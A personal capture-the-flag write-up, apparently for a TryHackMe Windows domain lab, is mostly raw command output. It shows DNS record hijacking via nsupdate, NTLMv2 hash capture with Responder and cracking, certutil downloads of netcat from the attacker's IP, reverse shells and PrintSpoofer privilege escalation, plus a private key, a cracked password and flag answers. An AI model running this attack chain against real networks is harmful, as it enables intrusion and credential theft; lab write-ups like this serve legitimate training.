lkteFaWXGZUMeEeP3qSENPnGZgXb+/LTsQByK0I0im4Qv0B3AKEGXaQzwcutgL+r
NEHRZAQ9OX8CgYApP/6aMONdAMqYwXHYF1RXyBhwRf1b9bD58vQH7YcXcEVwxE74
79Wtsd6Zy5kCRzdrBQfM1D9tqk8lHZ0cR0vScZvb+leaEDAD0fv961GZrU69Touz
pHsdyAQ2tysunEAA7X2zToafHqU2zzW2LyMIMik3K/bx2Pt2ttn9fxZSTQKBgE22
L3ihiOKcXFJPTnNYM24a8F699BOWHS/GOBTYepiY0EAlGemd1pace31UpziQAwI2
ajvhDDLTbrPl3qkPM8WNhZlbhJDdbB1HAVloSeMzMXWV2G0ZUWRbvafMy+DPG1wt
UXFso67gzBqPgAd8QvyMEFIR+lAFYY89H5ebHoFXAoGBAMZwew71UsZ9PVZ2xcxW
iIt7OSxbx4VnrDr3HCZ5NjVYdJrjDAFZrEA84/Mo1aXH/K4Fpq1lmTNIfQxPacG2
FRIKyIa9JdSaVUI1pBP5w6bsVOC4WiL1EQU3+2ImdFPm9ZRf1Y1uPuUzxe8EeebI
y+tQYYpi8HTqt2yzZ01n6C+0
-----END PRIVATE KEY-----

┌──(kali㉿kali)-[~/ra2]
└─$ sudo cp crt.pem /usr/share/responder/certs 
[sudo] password for kali: 
                                                                                             
┌──(kali㉿kali)-[~/ra2]
└─$ sudo cp key.pem /usr/share/responder/certs

┌──(kali㉿kali)-[~/ra2]
└─$ ls /usr/share/responder/certs
crt.pem  gen-self-signed-cert.sh  key.pem  responder.crt  responder.key

┌──(kali㉿kali)-[~/ra2]
└─$ tail /usr/share/responder/Responder.conf 

; HTML answer to inject in HTTP responses (before </body> tag).
; leave empty if you want to use the default one (redirect to SMB on your IP address).
HTMLToInject =

[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/crt.pem
SSLKey = certs/key.pem


Let’s send a request to delete the existing A record for `selfservice.windcorp.thm` and then send an update add request for a new A record to have selfservice resolve to our THM IP.

nsupdate is a command-line utility that allows you to submit Dynamic DNS Update requests to a DNS server. It is typically used to update resource records in the Domain Name System (DNS) in real-time, without the need to manually edit zone files or wait for DNS propagation.

nsupdate uses the DNS Update protocol, which is defined in RFC 2136 and allows clients to add, delete, or modify DNS resource records. It is often used in conjunction with the Internet Security Association and Key Management Protocol (ISAKMP) and the Oakley Key Determination Protocol (OKDP) to provide secure dynamic updates.

┌──(kali㉿kali)-[~/ra2]
└─$ nsupdate 
> server 10.10.85.102
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A 10.8.19.103
> send
> quit

┌──(kali㉿kali)-[~/ra2]
└─$ dig selfservice.windcorp.thm @10.10.85.102

; <<>> DiG 9.18.8-1-Debian <<>> selfservice.windcorp.thm @10.10.85.102
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20708
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;selfservice.windcorp.thm.      IN      A

;; ANSWER SECTION:
selfservice.windcorp.thm. 1234  IN      A       10.8.19.103

;; Query time: 212 msec
;; SERVER: 10.10.85.102#53(10.10.85.102) (UDP)
;; WHEN: Thu Dec 22 17:45:44 EST 2022
;; MSG SIZE  rcvd: 69

┌──(kali㉿kali)-[~/ra2]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.19.103]
    Responder IPv6             [fe80::103f:dc24:521e:1b71]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-9MHM78H1GWT]
    Responder Domain Name      [5NB7.LOCAL]
    Responder DCE-RPC Port     [48422]

[+] Listening for events...                                                                               

[HTTP] NTLMv2 Client   : 10.10.85.102
[HTTP] NTLMv2 Username : WINDCORP\edwardle
[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:41da90a415b80f32:7360F3E899DBEF61CE7F63812CC0D42F:01010000000000004B76EA465716D90116D7FA67C9A5BB01000000000200080035004E004200370001001E00570049004E002D0039004D0048004D0037003800480031004700570054000400140035004E00420037002E004C004F00430041004C0003003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96DECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000        
[SMB] NTLMv2-SSP Client   : 10.10.85.102
[SMB] NTLMv2-SSP Username : WINDCORP\edwardle
[SMB] NTLMv2-SSP Hash     : edwardle::WINDCORP:93a9d84a81f920e8:E11743A082BE174976EB58F54475B33F:01010000000000008027164C2D16D90122CB25F9ABAC9D3B000000000200080035004E004200370001001E00570049004E002D0039004D0048004D00370038004800310047005700540004003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F00430041004C000300140035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C00070008008027164C2D16D90106000400020000000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96DECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000                 
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle
[*] Skipping previously captured hash for WINDCORP\edwardle


┌──(kali㉿kali)-[~/ra2]
└─$ nano user_hash            
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!Angelus25!      (edwardle)     
1g 0:00:00:18 DONE (2022-12-22 17:49) 0.05552g/s 796343p/s 796343c/s 796343C/s !SkicA!..!)(^karabatak55
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ more user_hash 
edwardle::WINDCORP:93a9d84a81f920e8:E11743A082BE174976EB58F54475B33F:01010000000000008027164C2D16D90122CB2
5F9ABAC9D3B000000000200080035004E004200370001001E00570049004E002D0039004D0048004D0037003800480031004700570
0540004003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F004
30041004C000300140035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C0
0070008008027164C2D16D90106000400020000000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96D
ECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A001000000000000000000000000000000000000900200063006900660073002F0
0310030002E0038002E00310039002E003100300033000000000000000000

https://fire.windcorp.thm/powershell

edwardle:!Angelus25!
fire.windcorp.thm

Revshell

┌──(kali㉿kali)-[~/ra2]
└─$ locate nc.exe            
/home/kali/Downloads/steel_mountain/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ cp /home/kali/Downloads/steel_mountain/nc.exe nc.exe
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ ls           
cert.pfx  crt.pem  hash  key.pem  nc.exe  PrintSpoofer.exe  user_hash

┌──(kali㉿kali)-[~/ra2]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...


Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
PS C:\Users\edwardle.WINDCORP\Documents> 
whoami
windcorp\edwardle
PS C:\Users\edwardle.WINDCORP\Documents> 
certutil.exe -urlcache -f http://10.8.19.103:1337/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\edwardle.WINDCORP\Documents> 

┌──(kali㉿kali)-[~/ra2]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.85.102 - - [22/Dec/2022 17:57:47] "GET /nc.exe HTTP/1.1" 200 -
10.10.85.102 - - [22/Dec/2022 17:57:48] "GET /nc.exe HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/ra2]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

uhmm not work so using nc64.exe

┌──(kali㉿kali)-[~/ra2]
└─$ cp /home/kali/hackthebox/nc64.exe nc64.exe          
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ ls
cert.pfx  crt.pem  hash  key.pem  nc64.exe  nc.exe  PrintSpoofer.exe  user_hash
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ python3 -m http.server 1337               
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.85.102 - - [22/Dec/2022 18:06:49] "GET /nc64.exe HTTP/1.1" 200 -
10.10.85.102 - - [22/Dec/2022 18:06:50] "GET /nc64.exe HTTP/1.1" 200 -

PS C:\Users\edwardle.WINDCORP\Desktop>
certutil.exe -urlcache -f http://10.8.19.103:1337/nc64.exe nc64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\edwardle.WINDCORP\Desktop>
.\nc64.exe -e cmd.exe 10.8.19.103 9001

┌──(kali㉿kali)-[~/ra2]
└─$ rlwrap nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.85.102.
Ncat: Connection from 10.10.85.102:56903.
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\edwardle.WINDCORP\Desktop>whoami
whoami
windcorp\edwardle

C:\Users\edwardle.WINDCORP\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84E1-0562

 Directory of C:\Users\edwardle.WINDCORP\Desktop

12/22/2022  03:06 PM    <DIR>          .
12/22/2022  03:06 PM    <DIR>          ..
05/31/2020  09:12 AM                47 Flag 2.txt
12/22/2022  03:04 PM           138,017 nc.exe
12/22/2022  03:06 PM            45,272 nc64.exe
               3 File(s)        183,336 bytes
               2 Dir(s)  43,868,139,520 bytes free

C:\Users\edwardle.WINDCORP\Desktop>type 'Flag 2.txt'
type 'Flag 2.txt'
The system cannot find the file specified.
Error occurred while processing: 'Flag.
The system cannot find the file specified.
Error occurred while processing: 2.txt'.
C:\Users\edwardle.WINDCORP\Desktop>type "Flag 2.txt"
type "Flag 2.txt"
THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}

it works!

Privesc

C:\Users\edwardle.WINDCORP\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

 SeImpersonatePrivilege potential attack vector :) using printSpoofer


┌──(kali㉿kali)-[~/ra2]
└─$ ls
cert.pfx  crt.pem  hash  key.pem  nc64.exe  nc.exe  PrintSpoofer.exe  user_hash
                                                                                                          
┌──(kali㉿kali)-[~/ra2]
└─$ python3 -m http.server 1337               
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.85.102 - - [22/Dec/2022 18:06:49] "GET /nc64.exe HTTP/1.1" 200 -
10.10.85.102 - - [22/Dec/2022 18:06:50] "GET /nc64.exe HTTP/1.1" 200 -
10.10.85.102 - - [22/Dec/2022 18:14:19] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
10.10.85.102 - - [22/Dec/2022 18:14:20] "GET /PrintSpoofer.exe HTTP/1.1" 200 -

C:\Users\edwardle.WINDCORP\Desktop>certutil.exe -urlcache -f http://10.8.19.103:1337/PrintSpoofer.exe PrintSpoofer.exe
certutil.exe -urlcache -f http://10.8.19.103:1337/PrintSpoofer.exe PrintSpoofer.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\edwardle.WINDCORP\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84E1-0562

 Directory of C:\Users\edwardle.WINDCORP\Desktop

12/22/2022  03:14 PM    <DIR>          .
12/22/2022  03:14 PM    <DIR>          ..
05/31/2020  09:12 AM                47 Flag 2.txt
12/22/2022  03:04 PM           138,017 nc.exe
12/22/2022  03:06 PM            45,272 nc64.exe
12/22/2022  03:14 PM            27,136 PrintSpoofer.exe
               4 File(s)        210,472 bytes
               2 Dir(s)  43,867,873,280 bytes free

┌──(kali㉿kali)-[~/ra2]
└─$ rlwrap nc -lnvp 7777                                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777

C:\Users\edwardle.WINDCORP\Desktop>.\PrintSpoofer.exe -c ".\nc64.exe -e cmd.exe 10.8.19.103 7777"
.\PrintSpoofer.exe -c ".\nc64.exe -e cmd.exe 10.8.19.103 7777"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
[+] CreateProcessWithTokenW() OK


┌──(kali㉿kali)-[~/ra2]
└─$ rlwrap nc -lnvp 7777                                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.85.102.
Ncat: Connection from 10.10.85.102:55427.
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
windcorp\fire$

C:\Windows\system32>cd ..\..
cd ..\..

C:\>cd Users\Administrator\Desktop
cd Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84E1-0562

 Directory of C:\Users\Administrator\Desktop

06/01/2020  09:36 AM    <DIR>          .
06/01/2020  09:36 AM    <DIR>          ..
05/31/2020  01:32 AM                47 Flag 3.txt
               1 File(s)             47 bytes
               2 Dir(s)  43,867,742,208 bytes free

C:\Users\Administrator\Desktop>type "Flag 3.txt"
type "Flag 3.txt"
THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}

yep!! :)



```

![[Pasted image 20221222144248.png]]
![[Pasted image 20221222144303.png]]
![[Pasted image 20221222144450.png]]
![[Pasted image 20221222144506.png]]
![[Pasted image 20221222144527.png]]
![[Pasted image 20221222144546.png]]
![[Pasted image 20221222145741.png]]

![[Pasted image 20221222150032.png]]
![[Pasted image 20221222175142.png]]

![[Pasted image 20221222175244.png]]

![[Pasted image 20221222175650.png]]

What is flag 1?
*THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}*

  
What is flag 2?
*THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}*

What is flag 3?
*THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}*


[[Advent of Cyber 2022]]
